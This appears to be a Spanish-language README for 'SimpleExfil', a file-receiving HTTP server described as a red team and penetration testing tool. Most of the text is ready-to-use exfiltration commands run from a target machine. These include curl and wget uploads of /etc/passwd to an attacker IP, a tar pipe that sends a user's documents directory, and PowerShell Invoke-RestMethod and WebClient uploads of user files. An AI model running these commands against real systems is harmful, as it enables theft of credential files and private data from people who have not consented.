# SimpleExfil
Un servidor HTTP simple para recepción de archivos diseñado para actividades de Red Team y Penetration Testing.

# Exfiltrar archivos desde sistema objetivo
bash# curl -X POST -F "file=@/etc/passwd" http://[IP-ATACANTE]:8000
bash# wget --post-file=/path/to/file http://[IP-ATACANTE]:8000

# Subir múltiples archivos
curl -X POST -F "file=@documento.txt" -F "file=@config.conf" http://[IP-ATACANTE]:8000

# Comprimir y subir directorio
tar czf - /home/user/documents/ | curl -X POST -F "file=@-;filename=documents.tar.gz" http://[IP-ATACANTE]:8000

# PowerShell (Windows)
powershell# Invoke-RestMethod -Uri "http://[IP-ATACANTE]:8000" -Method Post -InFile "C:\Users\user\document.txt" -ContentType "multipart/form-data"

# Usando WebClient
$wc = New-Object System.Net.WebClient
$wc.UploadFile("http://[IP-ATACANTE]:8000", "C:\Users\user\file.txt")

🔧 Configuración
Puedes modificar las siguientes variables al inicio del script:
pythonPORT = 8000              # Puerto de escucha
UPLOAD_DIR = "./uploads"       # Directorio de destino
